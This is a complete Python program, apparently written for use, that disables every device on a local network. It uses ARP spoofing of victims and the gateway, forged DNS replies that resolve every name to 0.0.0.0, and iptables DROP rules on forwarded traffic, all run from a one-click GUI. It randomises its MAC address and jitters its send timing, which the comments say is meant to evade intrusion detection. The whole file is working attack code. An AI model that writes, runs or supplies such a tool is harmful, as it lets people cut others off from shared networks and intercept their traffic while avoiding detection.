#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TANODEV - OPERATOR EDITION
Codificado por: Un Operador Real
Objetivo: Anulación Total y Persistente de Red Local (DoS)
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import multiprocessing
import time
import random
import subprocess
import os
import sys
import signal
from scapy.all import (ARP, Ether, send, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr)

conf.verb = 0

# ==================== UTILIDADES DE OPERADOR ====================

def run_cmd(cmd_list):
    try: subprocess.run(cmd_list, capture_output=True, check=False)
    except: pass

def random_mac():
    return [0x00, 0x16, 0x3e,
            random.randint(0x00, 0x7f),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff)]

def set_mac(iface, mac):
    mac_str = ':'.join(map(lambda x: "%02x" % x, mac))
    run_cmd(["ip", "link", "set", "dev", iface, "down"])
    run_cmd(["ip", "link", "set", "dev", iface, "address", mac_str])
    run_cmd(["ip", "link", "set", "dev", iface, "up"])
    return mac_str

# ==================== MOTORES DE ATAQUE (PROCESOS INDEPENDIENTES) ====================

def motor_spoof_rafaga(targets_queue, control_event, net_info):
    """
    Motor de ráfaga de alta frecuencia.
    Recorre los objetivos activos en un ciclo continuo sin pausas fijas.
    """
    ip_gw = net_info['gw']
    mac_local = net_info['mac_l']
    mac_gw = net_info['mac_gw']
    
    active_targets = {} # {ip: mac}

    while not control_event.is_set():
        # Actualizar objetivos activos
        try:
            while not targets_queue.empty():
                ip, mac, active = targets_queue.get_nowait()
                if active: active_targets[ip] = mac
                elif ip in active_targets: del active_targets[ip]
        except: pass

        if active_targets:
            # Ráfaga agresiva sobre todos los objetivos activos
            for ip, mac in active_targets.items():
                try:
                    # Paquete 1: Engañar a la víctima ("Yo soy el Router")
                    p1 = ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_gw, hwsrc=mac_local)
                    # Paquete 2: Engañar al Router ("Yo soy la Víctima")
                    p2 = ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip, hwsrc=mac_local)
                    
                    send(p1, verbose=0, count=1)
                    send(p2, verbose=0, count=1)
                except: pass
        
        # Jitter para evitar detección de IDS (Patrón no lineal)
        # 1-3 segundos es suficiente para mantener el corte y no saturar
        control_event.wait(random.uniform(1.1, 2.9))

def motor_dns_blackhole(targets_queue, control_event, net_info):
    """
    Respuesta inmediata a DNS (0.0.0.0) para anular resolución de nombres.
    Usa AsyncSniffer para no bloquear.
    """
    ip_local = net_info['ip_l']
    active_ips = set()

    def dns_h(pkt):
        if not pkt.haslayer(DNSQR): return
        ip_src = pkt[IP].src
        if ip_src not in active_ips: return
        try:
            res = (IP(dst=ip_src, src=ip_local)/UDP(dport=pkt[UDP].sport, sport=53)/
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="0.0.0.0")))
            send(res, verbose=0, count=1)
        except: pass

    sniffer = AsyncSniffer(filter="udp port 53", prn=dns_h, store=0)
    sniffer.start()
    
    while not control_event.is_set():
        # Actualizar IPs activas para el sniffer
        try:
            while not targets_queue.empty():
                ip, mac, active = targets_queue.get_nowait()
                if active: active_ips.add(ip)
                elif ip in active_ips: active_ips.remove(ip)
        except: pass
        control_event.wait(0.5)
        
    sniffer.stop()

# ==================== INTERFAZ DE OPERADOR ( Tkinter ) ====================

class AppMuro:
    def __init__(self, root):
        self.root = root
        self.root.title("BLACK OPS v10 - OPERATOR INTERFACE")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")
        
        self.init_network()
        self.targets = {}
        
        # Colas de comunicación con los motores
        self.queue_spoof = multiprocessing.Queue()
        self.queue_dns = multiprocessing.Queue()
        self.control_event = multiprocessing.Event()
        
        self.setup_ui()
        self.start_engines()

    def init_network(self):
        try:
            route = subprocess.getoutput("ip route show default").split()
            iface = route[4]
            gw = route[2]
            ip_l = get_if_addr(iface)
            
            # Sigilo de Capa 2: Cambiar MAC al iniciar
            new_mac = set_mac(iface, random_mac())
            
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
            mac_gw = ans[0][1].hwsrc
            
            run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=1"])
            
            self.net_info = {'gw': gw, 'ip_l': ip_l, 'mac_l': new_mac, 'iface': iface, 'mac_gw': mac_gw}
        except:
            print("ERROR: No se detectó red. Requerido sudo."); sys.exit(1)

    def start_engines(self):
        # Motor de Spoofing
        self.proc_spoof = multiprocessing.Process(target=motor_spoof_rafaga, 
                                                 args=(self.queue_spoof, self.control_event, self.net_info))
        self.proc_spoof.start()
        
        # Motor de DNS Blackhole
        self.proc_dns = multiprocessing.Process(target=motor_dns_blackhole, 
                                               args=(self.queue_dns, self.control_event, self.net_info))
        self.proc_dns.start()

    def setup_ui(self):
        # Estilo Dark Pro
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background="#111", foreground="#0f0", fieldbackground="#111", font=("Consolas", 10))
        style.configure("Treeview.Heading", background="#222", foreground="#0f0", font=("Arial", 10, "bold"))
        
        header = tk.Label(self.root, text="NETWORK ANNIHILATOR v10 // BLACK OPS", bg="#b30000", fg="white", font=("Impact", 24), pady=10)
        header.pack(fill="x")

        ctrl_frame = tk.Frame(self.root, bg="#050505", pady=15)
        ctrl_frame.pack()
        
        # BOTONES DE CONTROL
        tk.Button(ctrl_frame, text="🔍 ESCANEAR RED", command=self.scan, width=15, bg="#1a1a1a", fg="#0f0", font=("Arial", 10, "bold")).pack(side="left", padx=5)
        tk.Button(ctrl_frame, text="🚀 ANULAR TODO", command=self.attack_all, width=15, bg="#400", fg="white", font=("Arial", 10, "bold")).pack(side="left", padx=5)
        tk.Button(ctrl_frame, text="🚨 RESTAURAR TODO", command=self.restore_all, width=15, bg="#004", fg="white", font=("Arial", 10, "bold")).pack(side="left", padx=5)

        # TABLA DE OBJETIVOS (Treeview)
        self.tree = ttk.Treeview(self.root, columns=("IP", "MAC", "STATUS"), show="headings", height=18)
        self.tree.heading("IP", text="DIRECCIÓN IP")
        self.tree.heading("MAC", text="DIRECCIÓN FÍSICA")
        self.tree.heading("STATUS", text="ESTADO DE CONEXIÓN")
        self.tree.pack(fill="both", expand=True, padx=20)
        
        # Doble clic para control individual
        self.tree.bind("<Double-1>", self.on_double_click)

        # LOG DE OPERACIONES
        self.log_area = scrolledtext.ScrolledText(self.root, height=10, bg="#000", fg="#0f0", font=("Consolas", 8))
        self.log_area.pack(fill="x", padx=20, pady=10)

    def log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{timestamp}] [*] {msg}\n")
        self.log_area.see(tk.END)

    def scan(self):
        self.log("Iniciando escaneo de ráfaga (Capa 2)...")
        red = self.net_info['gw'] + "/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=3, verbose=0)
        
        # Limpiar tabla
        for item in self.tree.get_children(): self.tree.delete(item)
        self.targets.clear()
        
        for _, rcv in ans:
            # Ignorarnos a nosotros y al gateway
            if rcv.psrc not in [self.net_info['ip_l'], self.net_info['gw']]:
                self.targets[rcv.psrc] = {'mac': rcv.hwsrc, 'active': False}
                self.tree.insert("", "end", iid=rcv.psrc, values=(rcv.psrc, rcv.hwsrc, "LIVE"))
        self.log(f"Escaneo finalizado. {len(ans)} dispositivos detectados.")

    def on_double_click(self, event):
        item = self.tree.selection()
        if item: self.toggle_target(item[0])

    def toggle_target(self, ip):
        """Control quirúrgico: Activa/Desactiva el DoS para una IP específica"""
        if ip not in self.targets: return
        
        is_active = not self.targets[ip]['active']
        self.targets[ip]['active'] = is_active
        
        # Actualizar UI
        status = "ANULADO" if is_active else "LIVE"
        self.tree.item(ip, values=(ip, self.targets[ip]['mac'], status))
        
        # Enviar actualización a los motores
        self.queue_spoof.put((ip, self.targets[ip]['mac'], is_active))
        self.queue_dns.put((ip, self.targets[ip]['mac'], is_active))
        
        # Aplicar IPtables (DROP silencioso)
        self.manage_iptables(ip, is_active)
        self.log(f"{'ATAQUE' if is_active else 'RESTAURACIÓN'} ejecutada en {ip}")

    def manage_iptables(self, ip, enable):
        """El Kernel hace el trabajo sucio. Python descansa."""
        cmd = "-I" if enable else "-D"
        # Bloquear forwarding de tráfico para esa IP
        run_cmd(["iptables", cmd, "FORWARD", "-s", ip, "-j", "DROP"])
        run_cmd(["iptables", cmd, "FORWARD", "-d", ip, "-j", "DROP"])

    def attack_all(self):
        self.log("Iniciando ANULACIÓN TOTAL de red...")
        for ip in self.targets:
            if not self.targets[ip]['active']: self.toggle_target(ip)

    def restore_all(self):
        self.log("Iniciando RESTAURACIÓN TOTAL de red...")
        for ip in self.targets:
            if self.targets[ip]['active']: self.toggle_target(ip)
        run_cmd(["iptables", "-F"])
        run_cmd(["iptables", "-t", "nat", "-F"])

    def on_close(self):
        if messagebox.askyesno("Salir", "¿Restaurar red antes de salir?"):
            self.restore_all()
        self.control_event.set()
        self.proc_spoof.join(timeout=1)
        self.proc_dns.join(timeout=1)
        self.root.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ESTE NIVEL DE ACCESO REQUIERE PRIVILEGIOS ROOT. USA SUDO."); sys.exit(1)
    
    # Manejo de multiprocessing en entornos con GUI
    multiprocessing.freeze_support()
    
    # Manejar señales de interrupción limpiamente
    def signal_handler(sig, frame):
        run_cmd(["iptables", "-F"])
        run_cmd(["iptables", "-t", "nat", "-F"])
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    
    root = tk.Tk()
    app = AppMuro(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
